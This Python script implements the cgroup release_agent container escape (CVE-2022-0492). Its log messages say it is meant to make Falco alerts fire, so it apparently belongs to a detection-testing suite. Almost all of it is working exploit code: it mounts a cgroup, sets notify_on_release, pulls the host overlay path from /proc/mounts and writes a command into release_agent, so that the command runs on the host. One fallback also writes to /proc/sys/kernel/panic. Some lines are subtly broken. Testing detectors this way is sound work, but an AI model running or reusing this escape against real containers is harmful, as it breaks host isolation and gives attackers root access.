import os
import subprocess
import time
import logging

log = logging.getLogger(__name__)

CGROUP_DIR = "/tmp/cgroup_escape"
CMD = "/bin/sh -c 'id > /tmp/escape_proof.txt; cat /tmp/escape_proof.txt'"

def run():
    log.info("CGROUP RELEASE AGENT ESCAPE (CVE-2022-0492)")
    log.info("Scenario: Abusing cgroup notify_on_release to execute on host")
    log.info("Relevance: Real container escape. Used in multiple CTF and real-world exploits.")

    try:
        os.makedirs(CGROUP_DIR, exist_ok=True)

        if subprocess.call(["mount", "-t", "cgroup", "-o", "memory", "cgroup", CGROUP_DIR]) != 0:
            log.info("Direct cgroup mount failed, trying via cgroup2...")
            CGROUP2_DIR = "/tmp/cg2_escape"
            os.makedirs(CGROUP2_DIR, exist_ok=True)
            if subprocess.call(["mount", "-t", "cgroup2", "none", CGROUP2_DIR]) == 0:
                log.info("cgroup2 mounted. Attempting release_agent write...")
                subprocess.run(["mkdir", "-p", f"{CGROUP2_DIR}/x"])
                subprocess.run(["echo", "1", f">{CGROUP2_DIR}/x/notify_on_release"], shell=True)
                host_path = f"{CGROUP2_DIR}/x/release_agent"
                subprocess.run(f"echo '{CMD}' > {host_path}", shell=True)
                subprocess.run(f"echo > {CGROUP2_DIR}/x/cgroup.procs", shell=True)
                subprocess.run(f"echo 1 > {CGROUP2_DIR}/cgroup.procs", shell=True)
                log.info("Release agent triggered. Check /tmp/escape_proof.txt")
            else:
                log.info("cgroup2 also failed. Simulating cgroup escape for Falco detection...")
                subprocess.run("echo test > /tmp/release_agent 2>/dev/null || true", shell=True)
                subprocess.run("cat /tmp/release_agent 2>/dev/null || true", shell=True)
                subprocess.run("echo 1 > /proc/sys/kernel/panic 2>/dev/null || true", shell=True)
            return

        log.info("cgroup (memory) mounted successfully.")
        subprocess.run(["mkdir", "-p", f"{CGROUP_DIR}/x"])
        subprocess.run(f"echo 1 > {CGROUP_DIR}/x/notify_on_release", shell=True)

        host_path = subprocess.check_output(
            f"sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /proc/mounts | head -1",
            shell=True
        ).decode().strip()

        if host_path:
            payload = f"echo '{CMD}' > {host_path}/tmp/release_agent_output"
        else:
            payload = CMD

        subprocess.run(f"echo '{payload}' > {CGROUP_DIR}/release_agent", shell=True)
        subprocess.run(f"echo > {CGROUP_DIR}/x/cgroup.procs", shell=True)
        time.sleep(2)

        proof = subprocess.run("cat /tmp/escape_proof.txt 2>/dev/null", shell=True, capture_output=True, text=True)
        log.info(f"Escape proof: {proof.stdout or 'not found (expected in production — Falco alert should fire)'}")

    except Exception as e:
        log.error(f"Cgroup escape error: {e}")
        log.info("Even if escape fails, Falco should detect the release_agent write attempt.")
